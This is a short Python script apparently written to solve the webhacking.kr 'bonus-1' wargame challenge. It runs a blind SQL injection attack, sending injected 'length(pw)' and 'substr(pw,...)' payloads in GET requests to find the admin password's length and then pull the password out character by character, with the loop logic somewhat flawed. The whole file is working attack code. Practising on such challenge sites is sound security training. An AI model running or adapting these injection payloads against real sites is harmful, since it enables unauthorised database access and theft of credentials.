import requests
url="https://webhacking.kr/challenge/bonus-1/index.php"
# Find password length
len = 35
while True:
    print(len)
    data = "?id=admin&pw=1%27+or+length%28pw%29%3D"+str(len)+"+and+%271%27%3D%271"
    r = requests.get(url + data)
    if r.text.find('wrong')!=-1:
        break
    len += 1
print("len=",len)

pw = 't'
idx=2
while True:
    for j in range(0, 127):
        data = "?id=admin&pw=1%27+or+substr%28pw%2C1%2C"+str(idx)+"%29%3D%27"+pw+chr(j)+"%27+and+%271%27%3D%271"
        r = requests.get(url + data)
        if r.text.find('wrong') != -1:
            pw += chr(j)
            idx=idx+1
            print(pw)
            continue